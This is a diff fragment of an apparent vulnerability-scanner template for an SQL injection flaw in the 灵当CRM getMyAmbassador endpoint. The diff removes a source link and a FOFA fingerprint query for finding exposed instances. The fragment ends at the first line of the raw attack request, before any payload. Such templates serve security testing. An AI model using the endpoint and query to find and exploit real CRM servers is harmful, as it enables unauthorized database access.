@@ -3,12 +3,8 @@ info:
   name: 灵当CRM getMyAmbassador 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pgk7s5e6hwpgvy2x'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pgk7s5e6hwpgvy2x
-    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
 http:
 - raw:
   - 'POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
